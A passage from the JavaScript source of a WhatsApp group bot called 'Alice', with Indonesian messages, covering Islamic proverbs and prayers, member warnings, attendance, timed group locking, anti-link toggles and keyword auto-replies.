 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
"id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
ReplyRynzz(`${arabic}\n${arti}`)
}
break

case 'doatahlil': {
if (isBan) return Xban()
await xreaction()
let { result } = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/islami/tahlil.json', 'utf-8'))
let caption = result.map((v, i) => {
return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
}).join('\n\n')
ReplyRynzz(`${caption}`)
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Islami Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Group Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'cekasalmember' : {
if (!m.isGroup) return Xgroup()
if (isBan) return Xban()
await xreaction()
const participants = await Alice.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  let member = groupMetadata.participants.length;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = 
  `
┌─⊷ *ASAL NEGARA*
Jumlah Anggota Grup Berdasarkan Negara:
🇮🇩 • Indonesia: ${countIndonesia}
🇲🇾 • Malaysia: ${countMalaysia}
🇺🇲 • USA + OTHER : ${countUSA}
🏳️ • Negara Lain: ${countOther}
👥 • jumlah semua mmeber: ${member}
└──────────────
`;

  ReplyRynzz(replyMessage);
}
break
case 'warn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    const target = mentionUser[0];
    if (!target) return Alice.sendMessage(m.chat, { text: 'Tag user yang ingin diberikan peringatan.' });

    const groupWarn = warnData[from] || { maxWarn: 3, warns: {} };
    groupWarn.warns[target] = (groupWarn.warns[target] || 0) + 1;

    if (groupWarn.warns[target] >= groupWarn.maxWarn) {
      delete groupWarn.warns[target];
      await Alice.groupParticipantsUpdate(from, [target], 'remove');
      Alice.sendMessage(m.chat, {
        text: `User @${target.split('@')[0]} telah mencapai batas peringatan dan telah dikeluarkan.`,
        mentions: [target],
      });
    } else {
      Alice.sendMessage(m.chat, {
        text: `User @${target.split('@')[0]} telah diberi peringatan (${groupWarn.warns[target]}/${groupWarn.maxWarn}).`,
        mentions: [target],
      });
    }

    warnData[from] = groupWarn;
    saveWarnData();
    }
break;
case 'warninfo': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });

    try {
        const metadata = await Alice.groupMetadata(m.chat);
        const groupName = metadata.subject;
        const groupWarn = warnData[m.chat] || { maxWarn: 3, warns: {} };
        const totalWarned = Object.keys(groupWarn.warns).length;
        const warnList = Object.entries(groupWarn.warns)
            .map(([user, count]) => `• @${user.split('@')[0]} (${count}/${groupWarn.maxWarn})`)
            .join('\n') || 'Tidak ada user yang mendapat peringatan.';

        const warnInfoText = `╭─── *「 ${groupName} 」*\n` +
            `│ *Max Warn:* ${groupWarn.maxWarn}\n` +
            `│ *Total User:* ${totalWarned}\n` +
            `╰──────────────\n\n` +
            `*List User:*\n${warnList}`;

        Alice.sendMessage(m.chat, { text: warnInfoText, mentions: Object.keys(groupWarn.warns) });
    } catch (err) {
        console.error(err);
        Alice.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil metadata grup.' });
    }
    }
break;
case 'setwarn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    const maxWarn = parseInt(args[0]);
    if (isNaN(maxWarn) || maxWarn <= 0) return Alice.sendMessage(m.chat, { text: 'Masukkan jumlah maksimal peringatan yang valid.' });

    const groupWarn = warnData[from] || { maxWarn: 3, warns: {} };
    groupWarn.maxWarn = maxWarn;

    warnData[from] = groupWarn;
    saveWarnData();

    Alice.sendMessage(m.chat, { text: `Jumlah maksimal peringatan di grup ini telah diatur menjadi ${maxWarn}.` });
    }
break;
case 'delwarn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    const target = mentionUser[0];
    if (!target) return Alice.sendMessage(m.chat, { text: 'Tag user yang ingin dihapus peringatannya.' });

    const warnCount = parseInt(args[1]);
    if (isNaN(warnCount) || warnCount <= 0) return Alice.sendMessage(m.chat, { text: 'Masukkan jumlah peringatan yang valid untuk dihapus.' });

    const groupWarn = warnData[from] || { maxWarn: 3, warns: {} };
    if (!groupWarn.warns[target]) return Alice.sendMessage(m.chat, { text: 'User ini tidak memiliki peringatan.' });

    if (groupWarn.warns[target] < warnCount) {
      return Alice.sendMessage(m.chat, { text: `User ini hanya memiliki ${groupWarn.warns[target]} peringatan.` });
    }

    groupWarn.warns[target] -= warnCount;
    if (groupWarn.warns[target] <= 0) delete groupWarn.warns[target];

    warnData[from] = groupWarn;
    saveWarnData();

    Alice.sendMessage(m.chat, {
      text: `Peringatan sebanyak ${warnCount} untuk user @${target.split('@')[0]} telah dihapus.`,
      mentions: [target],
    });
    }
break;
case 'reswarn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    if (!warnData[from]) return Alice.sendMessage(m.chat, { text: 'Tidak ada data peringatan di grup ini.' });

    delete warnData[from];
    saveWarnData();

    Alice.sendMessage(m.chat, { text: 'Semua peringatan di grup ini telah dihapus.' });
    }
break;

case 'autobio':
if (!isOwner) return Xowner()
if (args[0] == 'on'){
if (global.autodonlod) return ReplyRynzz('sudah aktif!')
global.autobio = true
ReplyRynzz('autobio aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return ReplyRynzz('sudah dimatikan!')
global.autobio = false
ReplyRynzz('autobio di matikan')
} else ReplyRynzz('on / off')
break

case 'autodownload':
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] == 'on'){
if (global.autodonlod) return ReplyRynzz('sudah aktif!')
global.autodonlod = true
ReplyRynzz('mode auto download aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return ReplyRynzz('sudah dimatikan!')
global.autodonlod = false
ReplyRynzz('mode auto download matikan')
} else ReplyRynzz('on / off')
break

case 'resetsider': {
if (!isAdmins) return Xadmin()
    if (db_sider && db_sider[from]) {
      delete db_sider[from];
      fs.writeFileSync('./AliceSystem/AliceDatabase/Group/sider.json', JSON.stringify(db_sider));
      ReplyRynzz("_Sider Berhasil Direset Pada Grub ini_")
    } else {
      ReplyRynzz("_Sider Sudah Direset Pada Grub ini_")
    }
}
break
case 'gcsider' : {
await Alice.sendPresenceUpdate('composing', m.chat)
    var lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();

    let member = groupMetadata.participants.map(v => v.id)
    if (!text) {
        var pesan = "Harap aktif di grup karena akan ada pembersihan member setiap saat"
    } else {
        var pesan = text
    }
    var sum
    sum = member.length
    var total = 0
    var sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof global.db.data.users[member[i]] == 'undefined' || milliseconds * 1 - global.db.data.users[member[i]].lastseen > lama) && !users.isAdmin) {
            if (typeof global.db.data.users[member[i]] !== 'undefined') {
                if (global.db.data.users[member[i]].banned == true) {
                    total++
                    sider.push(member[i])
                }
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total == 0) return ReplyRynzz(m.chat, `*Digrup ini tidak terdapat sider.*`, xy)
    ReplyRynzz(m.chat, `*${total}/${sum}* anggota grup *${await Alice.getName(m.chat)}* adalah sider dengan alasan :\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER :*\n${sider.map(v => '  ○ @' + v.replace(/@.+/, '' + typeof global.db.data.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - global.db.data.users[v].lastseen))).join('\n')}`, m, {
        contextInfo: {
            mentionedJid: sider
        }
    })
}
break


case 'listabsen': {
    if (!isAdmins) return Xadmin()
    if (!m.isGroup) return Xgroup()
    if (db_absen[from+hariini]) {
    let stringAbsen = `*LIST ABSEN [ ${hariini} ]*\n\n`
    stringAbsen += db_absen[from+hariini].map(absen => `⭔ @${absen.user_id.split('@')[0]} \n`).join('');    

    let arr_listabsen   = db_absen[from+hariini].map(absen => ({ id: absen.user_id }));
    let jumlahOrangAbsen= arr_listabsen.length;
    let total_orgdgrub  = participants.length;

    let lomAbsen        = total_orgdgrub - jumlahOrangAbsen

    if (lomAbsen == 0) {
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen Semua`
    }else{
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen, Tersisa ${lomAbsen} Orang`
    }

    Alice.sendMessage(m.chat, { text: stringAbsen, mentions: arr_listabsen.map(a => a.id) }, { quoted: m })

    } else{
        return ReplyRynzz('Belum ada absen hari ini')
    }
}
break
case 'absen': {
    if (!m.isGroup) return Xgroup()
    if (!db_absen[from+hariini]) {

        // pertama absen
        db_absen[from+hariini] = [{ user_id: sender, tanggal: hariini }];
        ReplyRynzz('Absen Berhasil')
    }else {

        // absen kedua
      const sudah_absen = db_absen[from+hariini].findIndex(item => item.user_id === sender);

      if (sudah_absen !== -1) {
            ReplyRynzz('Kamu sudah absen hari ini')
        }else {
            ReplyRynzz('Absen Berhasil')
            db_absen[from+hariini].push({ user_id: sender, tanggal: hariini });
        }
          
    }

 fs.writeFileSync('./AliceSystem/AliceDatabase/Group//absen.json', JSON.stringify(db_absen))

}
break


			case 'closetime':
                if (!m.isGroup) return ReplyRynzz("*[ sʏsᴛᴇᴍ ]* ᴋʜᴜsᴜs ɢʀᴏᴜᴘ ᴅᴏᴀɴɢ")
                if (!isAdmins && !isOwner) return ReplyRynzz("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isBotAdmins) return ReplyRynzz("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return ReplyRynzz('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                ReplyRynzz(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    Alice.groupSettingUpdate(m.chat, 'announcement')
                    ReplyRynzz(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return ReplyRynzz("*[ sʏsᴛᴇᴍ ]* ᴋʜᴜsᴜs ɢʀᴏᴜᴘ ᴅᴏᴀɴɢ")
                if (!isAdmins && !isOwner) return Xadmin()
                if (!isBotAdmins) return ReplyRynzz("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return ReplyRynzz('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                ReplyRynzz(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    Alice.groupSettingUpdate(m.chat, 'not_announcement')
                    ReplyRynzz(open)
                }, timer)
                break


case 'group':
case 'setgroup': 
case 'groupset': 
case 'setgc':{
if(!isOwner) return Xadmin()
const caption = `Silahkan Dipilih Atmin`;
let sections = [
{
highlight_label: 'Alice Antilinkall',
rows: [{
title: 'Nyalakan Antilinkall',
id: `${Xyroo}antilinkall on`
}]
},
{
highlight_label: 'Alice Antilinkall',
rows: [{
title: 'Nyalakan Antilinkall',
id: `${Xyroo}antilinkall off`
}]
},
{
highlight_label: 'Alice Antilinkgc',
rows: [{
title: 'Nyalakan Antilinkgc',
id: `${Xyroo}antilinkgc on`
}]
},
{
highlight_label: 'Alice Antilinkgc',
rows: [{
title: 'Matikan Antilinkgc',
id: `${Xyroo}antilinkgc off`
}]
},
{
highlight_label: 'Alice Antitoxic',
rows: [{
title: 'Nyalakan Antitoxic',
id: `${Xyroo}antitoxic on`
}]
},
{
highlight_label: 'Alice Antitoxic',
rows: [{
title: 'Matikan Antitoxic',
id: `${Xyroo}antitoxic off`
}]
},
{
highlight_label: 'Alice AntiNomorAsing',
rows: [{
title: 'Nyalakan AntiNomorAsing',
id: `${Xyroo}antiasing on`
}]
},
{
highlight_label: 'Alice AntiNomorAsing',
rows: [{
title: 'Matikan AntiNomorAsing',
id: `${Xyroo}antiasing off`
}]
},
{
highlight_label: 'Alice Antilinkfb',
rows: [{
title: 'Nyalakan Antilinkfb',
id: `${Xyroo}antilinkfb on`
}]
},
{
highlight_label: 'Alice Antilinkfb',
rows: [{
title: 'Matikan Antilinkfb',
id: `${Xyroo}antilinkfb off`
}]
},
{
highlight_label: 'Alice Antilinkig',
rows: [{
title: 'Nyalakan Antilinkig',
id: `${Xyroo}antilinkig on`
}]
},
{
highlight_label: 'Alice Antilinkig',
rows: [{
title: 'Matikan Antilinkig',
id: `${Xyroo}antilinkig off`
}]
},
{
highlight_label: 'Alice Autodownload',
rows: [{
title: 'Nyalakan Autodownload',
id: `${Xyroo}autodownload on`
}]
},
{
highlight_label: 'Alice Autodownload',
rows: [{
title: 'Matikan Autodownload',
id: `${Xyroo}autodownload off`
}]
},
{
highlight_label: 'Alice Antivirtek',
rows: [{
title: 'Nyalakan Antivirtek',
id: `${Xyroo}antivirtex on`
}]
},
{
highlight_label: 'Alice Antivirtek',
rows: [{
title: 'Matikan Antivirtek',
id: `${Xyroo}antivirtex off`
}]
},
{
highlight_label: 'Alice Antilinkyt',
rows: [{
title: 'Nyalakan Antilinkyt',
id: `${Xyroo}antilinkyt on`
}]
},
{
highlight_label: 'Alice Antilinkyt',
rows: [{
title: 'Matikan Antilinkyt',
id: `${Xyroo}antilinkyt off`
}]
},
{
highlight_label: 'Alice Antilinktele',
rows: [{
title: 'Nyalakan Antilinktele',
id: `${Xyroo}antilinktele on`
}]
},
{
highlight_label: 'Alice Antilinktele',
rows: [{
title: 'Matikan Antilinktele',
id: `${Xyroo}antilinktele off`
}]
},
{
highlight_label: 'Alice Antilinkytch',
rows: [{
title: 'Nyalakan Antilinkytch',
id: `${Xyroo}antilinkytch on`
}]
},
{
highlight_label: 'Alice Antilinkytch',
rows: [{
title: 'Matikan Antilinkytch',
id: `${Xyroo}antilinkytch off`
}]
},
{
highlight_label: 'Alice AntiTiktok',
rows: [{
title: 'Nyalakan AntiTiktok',
id: `${Xyroo}antilinktiktok on`
}]
},
{
highlight_label: 'Alice AntiTiktok',
rows: [{
title: 'Matikan AntiTiktok',
id: `${Xyroo}antilinktiktok off`
}]
},
{
highlight_label: 'Alice Antilinktwitter',
rows: [{
title: 'Nyalakan Antilinktwitter',
id: `${Xyroo}antilinktwitter on`
}]
},
{
highlight_label: 'Alice Antilinktwitter',
rows: [{
title: 'Matikan Antilinktwitter',
id: `${Xyroo}antilinktwitter off`
}]
},
{
highlight_label: 'Alice Antilinkbokep',
rows: [{
title: 'Nyalakan Antilinkbokep',
id: `${Xyroo}antilinkbokep on`
}]
},
{
highlight_label: 'Alice Antilinkbokep',
rows: [{
title: 'Matikan Antilinkbokep',
id: `${Xyroo}antilinkbokep off`
}]
},
{
highlight_label: 'Alice Antilinkterabox',
rows: [{
title: 'Nyalakan Antilinkterabox',
id: `${Xyroo}ntilinkterabox on`
}]
},
{
highlight_label: 'Alice Antilinkterabox',
rows: [{
title: 'Matikan Antilinkterabox',
id: `${Xyroo}antilinkterabox off`
}]
},
{
highlight_label: 'Alice AntilinkMediafire',
rows: [{
title: 'Nyalakan AntilinkMediafire',
id: `${Xyroo}antilinkmediafire on`
}]
},
{
highlight_label: 'Alice AntilinkMediafire',
rows: [{
title: 'Matikan AntilinkMediafire',
id: `${Xyroo}antilinkmediafire off`
}]
},
{
highlight_label: 'Alice AntiPoll',
rows: [{
title: 'Nyalakan AntiPoll',
id: `${Xyroo}antipoll on`
}]
},
{
highlight_label: 'Alice AntiPoll',
rows: [{
title: 'Matikan AntiPoll',
id: `${Xyroo}antipoll off`
}]
},
{
highlight_label: 'Alice Antisticker',
rows: [{
title: 'Nyalakan Antisticker',
id: `${Xyroo}antisticker on`
}]
},
{
highlight_label: 'Alice Antisticker',
rows: [{
title: 'Matikan Antisticker',
id: `${Xyroo}antisticker off`
}]
},
{
highlight_label: 'Alice Antiimage',
rows: [{
title: 'Nyalakan Antiimage',
id: `${Xyroo}antiimage on`
}]
},
{
highlight_label: 'Alice Antiimage',
rows: [{
title: 'Matikan Antiimage',
id: `${Xyroo}antiimage off`
}]
},
{
highlight_label: 'Alice Antivideo',
rows: [{
title: 'Nyalakan Antivideo',
id: `${Xyroo}antivideo on`
}]
},
{
highlight_label: 'Alice Antivideo',
rows: [{
title: 'Matikan Antivideo',
id: `${Xyroo}antivideo off`
}]
},
{
highlight_label: 'Alice Antibot',
rows: [{
title: 'Nyalakan Antibot',
id: `${Xyroo}antibot on`
}]
},
{
highlight_label: 'Alice Antibot',
rows: [{
title: 'Matikan Antibot',
id: `${Xyroo}antibot off`
}]
},
{
highlight_label: 'Alice Antimedia',
rows: [{
title: 'Nyalakan Antimedia',
id: `${Xyroo}antimedia on`
}]
},
{
highlight_label: 'Alice Antimedia',
rows: [{
title: 'Matikan Antimedia',
id: `${Xyroo}antimedia off`
}]
},
{
highlight_label: 'Alice Antidocument',
rows: [{
title: 'Nyalakan Antidocument',
id: `${Xyroo}antidocument on`
}]
},
{
highlight_label: 'Alice Antidocument',
rows: [{
title: 'Matikan Antidocument',
id: `${Xyroo}antidocument off`
}]
},
{
highlight_label: 'Alice Anticontact',
rows: [{
title: 'Nyalakan Anticontact',
id: `${Xyroo}anticontact on`
}]
},
{
highlight_label: 'Alice Anticontact',
rows: [{
title: 'Matikan Anticontact',
id: `${Xyroo}anticontact off`
}]
},
{
highlight_label: 'Alice Antilocation',
rows: [{
title: 'Nyalakan Antilocation',
id: `${Xyroo}antilocation on`
}]
},
{
highlight_label: 'Alice Antilocation',
rows: [{
title: 'Matikan Antilocation',
id: `${Xyroo}antilocation off`
}]
},
{
highlight_label: 'Alice Antilinkkick',
rows: [{
title: 'Nyalakan Antilinkkick',
id: `${Xyroo}antilinkkick on`
}]
},
{
highlight_label: 'Alice Antilinkkick',
rows: [{
title: 'Matikan Antilinkkick',
id: `${Xyroo}antilinkkick off`
}]
},
{
highlight_label: 'Alice Antiaudio',
rows: [{
title: 'Nyalakan AntiAudio',
id: `${Xyroo}antiaudio on`
}]
},
{
highlight_label: 'Alice Antiaudio',
rows: [{
title: 'Matikan AntiAudio',
id: `${Xyroo}antiaudio off`
}]
},
{
highlight_label: 'Alice Group',
rows: [{
title: 'Buka Group',
id: `${Xyroo}gc open`
}]
},
{
highlight_label: 'Alice Group',
rows: [{
title: 'Tutup Group',
id: `${Xyroo}gc close`
}]
}]

let listMessage = {
    title: `Setting Group`, 
    sections
}


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: author,
 newsletterJid: idch,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Alice.decodeJid(Alice.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: packname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `Haii Atmin`,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: thumb } }, { upload: Alice.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
 }
 ],
 })
 })
 }
 }
}, {})

if (!text) await Alice.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

			case 'antispam':{
				if (!m.isGroup) return Xgroup()
				if (!isBotAdmins) return Xbotadmin
				if (!isAdmins) return Xadmin()
				if (args.length < 1) return ReplyRynzz('on/off?')
				if (args[0] === 'on') {
					db.data.chats[m.chat].antispam = true
					ReplyRynzz(`${command} is enabled`)
				} else if (args[0] === 'off') {
					db.data.chats[m.chat].antispam = false
					ReplyRynzz(`${command} is disabled`)
				}
			}
			break;
			
case 'antipoll':
        handleFeatureToggle('antipoll', command);
        break;

    case 'antisticker':
        handleFeatureToggle('antisticker', command);
        break;

    case 'antiimage':
        handleFeatureToggle('antiimage', command);
        break;

    case 'antivideo':
        handleFeatureToggle('antivideo', command);
        break;

    case 'antibot':
        handleFeatureToggle('antibot', command);
        break;
        
    case 'antiviewonce':
        handleFeatureToggle('antiviewonce', command);
        break;


    case 'antimedia':
        handleFeatureToggle('antimedia', command);
        break;

    case 'antidocument':
        handleFeatureToggle('antidocument', command);
        break;

    case 'anticontact':
        handleFeatureToggle('anticontact', command);
        break;

    case 'antilocation':
        handleFeatureToggle('antilocation', command);
        break;

    case 'antilinkgc':
        handleFeatureToggle('antilinkgc', command);
        break;

    case 'antipromotion':
        handleFeatureToggle('antipromotion', command);
        break;

    case 'antiaudio':
        handleFeatureToggle('antiaudio', command);
        break;
        
            case 'antilinkkick': {
                if (!m.isGroup) return Xgroup()
                if (!isAdmins) return Xadmin()
                if (!isBotAdmins) return Xbotadmin()
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinkkick) return ReplyRynzz(`☘️ *Autokick Link Aktif*`)
                    db.data.chats[m.chat].antilinkkick = true
                    ReplyRynzz(`*Autokick Link Aktif*`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinkkick) return ReplyRynzz(`*Autokick Link Di Nonatifkan*`)
                    db.data.chats[m.chat].antilinkkick = false
                    ReplyRynzz(`☘️ *Autokick Nonaktif*`)
                } else {
                    ReplyRynzz(`☘️ *Ketik ${XyrooRynzz} on/off*`)
                }
            }
            break        
                
case 'linkgroup':
case 'grouplink':
case 'linkgrup':
case 'linkgc': {
    if (!isAdmins) return Xadmin()
    if (!m.isGroup) return m.Xgroup();
    if (!isBotAdmins) return m.Xbotadmin;
    let response = await Alice.groupInviteCode(m.chat);
    let code = `https://chat.whatsapp.com/${response}`;
    let capt = `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n👥 *Member :* ${groupMetadata.participants.length}`;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: capt
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": `{\"display_text\":\"Link Group\",\"id\":\"123456789\",\"copy_code\":\"${code}\"}`
                            },
                        ],
                    })
                })
            }
        }
    }, { quoted: m });

    await Alice.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;                

case 'list': {
  if (db_respon_list.length === 0) return ReplyRynzz(`Belum ada list respon didalam database!`)
  if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return ReplyRynzz(`Belum ada list respon didalam grup ini!`)
  let teks = `Halo ${pushname}, Berikut adalah list respon digrup ini.\n\n`
  for (let i of db_respon_list) {
    if (i.id === m.chat) {
      teks += `- ${i.key.toUpperCase()}\n`
    }
  }
  teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada Didalam list respon. Misal ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} Kepada Bot`
  Alice.sendMessage(m.chat, {
    text: teks,
    mentions: [m.sender]
  }, {
    quoted: m
  })
}
break

case 'addlist':
if (!m.isGroup) return Xgroup()
if (!isAdmins) return Xadmin()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return ReplyRynzz(`Gunakan dengan cara ${XyrooRynzz} key|respon\n\nContoh: ${XyrooRynzz} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return ReplyRynzz(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await Alice.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      addResponList(m.chat, args1, args2, true, url, db_respon_list)
      ReplyRynzz(`Sukses addlist respon\nKey: ${args1}`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  addResponList(m.chat, args1, args2, false, '-', db_respon_list)
  ReplyRynzz(`Sukses addlist respon\nKey: ${args1}`)
}
break

case 'dellist':
if (!m.isGroup) return Xgroup()
if (!isAdmins) return Xadmin()
if (db_respon_list.length === 0) return ReplyRynzz(`Belum ada list respon didalam database!`)
if (!text) return ReplyRynzz(`Gunakan dengan xara ${XyrooRynzz} key\n\nContoh: ${XyrooRynzz} tes`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return ReplyRynzz(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
ReplyRynzz(`Sukses dellist respon dengan key: ${q}`)
break

case 'update':
case 'updatelist':
if (!m.isGroup) return Xgroup()
if (!isAdmins) return Xadmin()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return ReplyRynzz(`Gunakan dengan cara ${XyrooRynzz} key|respon\n\nContoh: ${XyrooRynzz} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return ReplyRynzz(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await Alice.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      updateResponList(m.chat, args1, args2, true, url, db_respon_list)
      ReplyRynzz(`Berhasil update respon list dengan key *${args1}*`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
  ReplyRynzz(`Berhasil update respon list dengan key *${args1}*`)
}
break

case 'afk': {
  if (!m.isGroup) return Xgroup()
  if (m.key.fromMe) return ReplyRynzz('Bot tidak dapat AFK')
